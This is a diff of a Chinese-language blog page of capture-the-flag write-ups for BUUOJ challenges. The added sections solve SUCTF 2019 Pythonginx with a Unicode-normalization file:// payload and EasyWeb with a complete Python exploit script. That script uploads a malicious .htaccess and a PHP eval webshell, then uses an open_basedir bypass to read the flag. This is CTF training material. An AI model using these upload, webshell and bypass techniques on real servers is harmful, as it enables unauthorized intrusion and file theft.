@@ -16,7 +16,7 @@
   <meta name="description" content="心之所向皆是遗憾，目之所及皆是过往">
   <meta name="author" content="2cu">
   <meta name="keywords" content>
-  <title>(ctf)buuoj刷题ing-low_level - 2cu的博客</title>
+  <title>buuoj刷题--随缘 - 2cu的博客</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
 <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
@@ -156,7 +156,7 @@
                   
                   <span class="post-meta mr-2">
                     <i class="iconfont icon-chart"></i>
-                    2.3k 字
+                    2.7k 字
                   </span>
                 
 
@@ -166,7 +166,7 @@
                       <i class="iconfont icon-clock-fill"></i>
                     
                     
-                    40
+                    48
                      分钟
                   </span>
                 
@@ -195,7 +195,7 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h1 id="ctf-buuoj刷题ing"><a href="#ctf-buuoj刷题ing" class="headerlink" title="(ctf)buuoj刷题ing"></a>(ctf)buuoj刷题ing</h1><a id="more"></a>
+              <h1 id="buuoj刷题–随缘"><a href="#buuoj刷题–随缘" class="headerlink" title="buuoj刷题–随缘"></a>buuoj刷题–随缘</h1><a id="more"></a>
 
 <h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><pre><code class="hljs undefined">def fuck1():
     burp0_url = &quot;http://76665c6a-9447-4456-ae5b-8865ff5260dc.node3.buuoj.cn:80/index.php&quot;
@@ -520,6 +520,58 @@ echo serialize($a);
 <p><img src="https://s1.ax1x.com/2020/05/14/YDWOFs.png" srcset="/img/loading.gif" alt="YDWOFs.png"></p>
 <p>访问show.php,得到flag</p>
 <p><img src="https://s1.ax1x.com/2020/05/14/YDR280.png" srcset="/img/loading.gif" alt="YDR280.png"></p>
+<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>参考博文<a href="https://blog.csdn.net/qq_42181428/article/details/99741920" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/99741920</a></p>
+<p>考点<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
+<pre><code class="hljs undefined">file://suctf.c℆sr/local/nginx/conf/nginx.conf</code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/05/15/YsLPW8.png" srcset="/img/loading.gif" alt="YsLPW8.png"></p>
+<pre><code class="hljs undefined">file://suctf.c℆sr/fffffflag</code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/05/15/YsLCJf.png" srcset="/img/loading.gif" alt="YsLCJf.png"></p>
+<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>考点：</p>
+<ol>
+<li>无字母数字webshell和fuzz =&gt;<a href="https://xz.aliyun.com/t/5677#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/5677#toc-9</a></li>
+<li>利用.htaccess上传文件</li>
+<li>绕过open_basedir =&gt;<a href="https://skysec.top/2019/04/12/从PHP底层看open-basedir-bypass/#ini-set覆盖问题探索" target="_blank" rel="noopener">https://skysec.top/2019/04/12/从PHP底层看open-basedir-bypass/#ini-set覆盖问题探索</a></li>
+</ol>
+<p>exp.py  一键getshell脚本</p>
+<pre><code class="hljs undefined">import requests
+import base64
+
+url = &quot;http://33411e5c-5e3b-4f13-9a01-8eda2d41ca77.node3.buuoj.cn/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag&quot;
+
+
+htaccess = b&quot;&quot;&quot;\x00\x00\x8a\x39\x8a\x39
+AddType application/x-httpd-php .zzzz
+php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.zzzz&quot;
+&quot;&quot;&quot;
+# /var/www/html/upload/tmp_48cd8b43081896fbd0931d204f947663
+shell = b&quot;\x00\x00\x8a\x39\x8a\x39&quot;+b&quot;00&quot;+ base64.b64encode(b&quot;&lt;?php eval($_GET[&apos;c&apos;]);?&gt;&quot;)
+# shell =  b&quot;\x00\x00\x8a\x39\x8a\x39&quot;+b&quot;00&quot; + &quot;&lt;script language=&apos;php&apos;&gt;eval($_REQUEST[c]);&lt;/script&gt;&quot;
+
+files = [(&apos;file&apos;,(&apos;.htaccess&apos;,htaccess,&apos;image/jpeg&apos;))]
+
+data = &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;
+
+print(&quot;upload .htaccess&quot;)
+r1 = requests.post(url=url,files=files)
+
+print r1.text
+
+print(&quot;upload shell.zzzz&quot;)
+
+files = [(&apos;file&apos;,(&apos;shell.zzzz&apos;,shell,&apos;application/octet-stream&apos;))]
+r2 = requests.post(url=url,files=files)
+print r2.text
+dir = r2.text
+# # r = requests.get(&apos;http://33411e5c-5e3b-4f13-9a01-8eda2d41ca77.node3.buuoj.cn/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz?c=system(%27ls%27);&apos;)
+# # r = requests.get(&quot;http://33411e5c-5e3b-4f13-9a01-8eda2d41ca77.node3.buuoj.cn/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz?c=chdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(scandir(&apos;/&apos;));&quot;)
+url3 = &quot;http://33411e5c-5e3b-4f13-9a01-8eda2d41ca77.node3.buuoj.cn/&quot;+dir
+r3 = requests.get(url=url3+&quot;?c=chdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(file_get_contents(&apos;/THis_Is_tHe_F14g&apos;));&quot;)
+print url3
+print r3.text</code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/05/15/YyaP4U.png" srcset="/img/loading.gif" alt="YyaP4U.png"></p>
 
             </article>
             <hr>
@@ -703,7 +755,7 @@ echo serialize($a);
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "(ctf)buuoj刷题ing-low_level&nbsp;",
+        "buuoj刷题--随缘&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
